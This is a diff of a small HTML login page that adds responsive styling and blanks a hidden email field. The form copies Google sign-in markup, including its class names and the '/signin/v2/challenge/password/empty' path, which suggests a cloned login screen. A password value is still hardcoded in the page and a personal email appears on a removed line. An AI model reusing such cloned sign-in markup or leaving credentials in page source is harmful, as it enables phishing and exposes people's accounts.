@@ -3,6 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>for check</title>
     <style type="text/css">
     body {
@@ -93,6 +94,18 @@
     .login-block button:hover {
         background: #ff7b81;
     }
+
+    @media only screen and (max-width: 600px) {
+        .login-block {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 20px;
+            background: #fff;
+            border-radius: 5px;
+            border-top: 5px solid #ff656c;
+            margin: 0 auto;
+        }
+    }
     </style>
 </head>
 
@@ -102,7 +115,7 @@
     <div class="login-block">
         <h1>Login</h1>
         <form action="/signin/v2/challenge/password/empty" method="post" novalidate="">
-            <input type="email" name="identifier" class="VwCw" tabindex="-1" aria-hidden="true" spellcheck="false" value="mymail.rakesh@gmail.com" jsname="KKx9x" autocomplete="off" id="hiddenEmail">
+            <input type="email" name="identifier" class="VwCw" tabindex="-1" aria-hidden="true" spellcheck="false" value="" jsname="KKx9x" autocomplete="off" id="hiddenEmail">
             <input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="password" autocapitalize="off" autocorrect="off" data-initial-value="mukeshDE-201" badinput="false" dir="ltr">
             <button>Submit</button>
     </div>
